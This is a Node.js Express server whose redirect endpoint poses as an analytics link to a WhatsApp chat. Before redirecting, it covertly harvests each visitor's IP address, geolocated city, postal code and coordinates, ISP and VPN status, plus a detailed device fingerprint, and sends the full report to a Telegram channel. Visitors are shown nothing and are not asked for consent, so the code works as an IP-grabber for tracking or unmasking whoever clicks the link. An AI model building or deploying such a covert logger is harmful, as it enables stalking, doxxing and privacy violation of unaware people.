import path from "node:path";
import { pathToFileURL } from "node:url";
import compression from "compression";
import dotenv from "dotenv";
import express from "express";
import rateLimit from "express-rate-limit";
import helmet from "helmet";
import { parseDevice } from "../utils/device.js";
import { getClientIp } from "../utils/ip.js";
import { lookupLocation } from "../utils/location.js";
import { formatTelegramReport, sendTelegramReport } from "../utils/telegram.js";

dotenv.config();

const app = express();
const publicDir = path.resolve("public");
const whatsappUrl = process.env.WHATSAPP_URL || "https://wa.me/628xxxxxxxxxx";

app.set("trust proxy", 1);
app.disable("x-powered-by");
app.use(helmet());
app.use(compression());
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(
  rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 60,
    standardHeaders: true,
    legacyHeaders: false,
  }),
);
app.use(express.static(publicDir));

app.get("/", (_req, res) => {
  res.sendFile(path.join(publicDir, "index.html"));
});

app.get("/api/redirect", async (req, res) => {
  try {
    // Collect the request metadata that is needed for the analytics report.
    const ip = getClientIp(req);
    const userAgent = req.headers['user-agent'] || '';
    const acceptLanguage = req.headers['accept-language'] || '';
    const query = req.query || {};

    const sanitizeValue = (value) => {
      if (typeof value !== 'string') {
        return '';
      }
      return value.slice(0, 120).replace(/\s+/g, ' ').trim();
    };

    const device = parseDevice(userAgent, {
      locale: sanitizeValue(query.locale || acceptLanguage),
      cookiesEnabled: sanitizeValue(query.cookiesEnabled || 'true'),
      doNotTrack: sanitizeValue(query.doNotTrack || req.headers['dnt'] || 'unknown'),
      screenResolution: sanitizeValue(query.screenResolution || ''),
      colorDepth: sanitizeValue(query.colorDepth || ''),
      viewport: sanitizeValue(query.viewport || ''),
      deviceMemory: sanitizeValue(query.deviceMemory || ''),
      hardwareConcurrency: sanitizeValue(query.hardwareConcurrency || ''),
      touchSupport: sanitizeValue(query.touchSupport || ''),
      connectionType: sanitizeValue(query.connectionType || ''),
    });

    const location = await lookupLocation(ip).catch(() => null);

    const now = new Date();
    const report = {
      time: now.toISOString(),
      localTime: now.toString(),
      timestamp: Math.floor(now.getTime() / 1000),
      ip,
      forwardedFor: (req.headers["x-forwarded-for"] || "").toString(),
      ipVersion: ip.includes(":") ? "IPv6" : "IPv4",
      country: location?.country || "Unknown",
      countryCode: location?.country_code || "Unknown",
      region: location?.region || "Unknown",
      city: location?.city || "Unknown",
      postalCode: location?.postal || "Unknown",
      timezone: location?.timezone || "Unknown",
      latitude: location?.latitude || "Unknown",
      longitude: location?.longitude || "Unknown",
      isp: location?.org || location?.isp || "Unknown",
      asn: location?.asn || "Unknown",
      organization: location?.org || "Unknown",
      connectionType: location?.connection_type || location?.type || "Unknown",
      vpn: location?.threat || location?.proxy || "Unknown",
      browser: device.browser.name,
      browserVersion: device.browser.version,
      engine: device.engine.name,
      language: device.language,
      platform: device.platform,
      cookies: device.cookiesEnabled,
      doNotTrack: device.doNotTrack,
      screen: device.screenResolution,
      colorDepth: device.colorDepth,
      viewport: device.viewport,
      deviceMemory: device.deviceMemory,
      hardwareConcurrency: device.hardwareConcurrency,
      deviceType: device.device.type || "Desktop",
      brand: device.device.brand || "Unknown",
      model: device.device.model || "Unknown",
      os: device.os.name,
      osVersion: device.os.version,
      mobile: device.mobile,
      tablet: device.tablet,
      touchSupport: device.touchSupport,
      userAgent,
    };

    const message = formatTelegramReport(report);
    void sendTelegramReport(message).catch((error) => {
      console.error("Telegram notification failed:", error.message);
    });

    res.redirect(302, whatsappUrl);
  } catch (error) {
    console.error("Visitor redirect failed:", error.message);
    res.redirect(302, whatsappUrl);
  }
});

const isEntryPoint = process.argv[1]
  ? pathToFileURL(process.argv[1]).href === import.meta.url
  : false;

if (isEntryPoint) {
  const port = Number(process.env.PORT || 3000);
  app.listen(port, () => {
    console.log(`Analytics redirect server listening on port ${port}`);
  });
}

export default app;
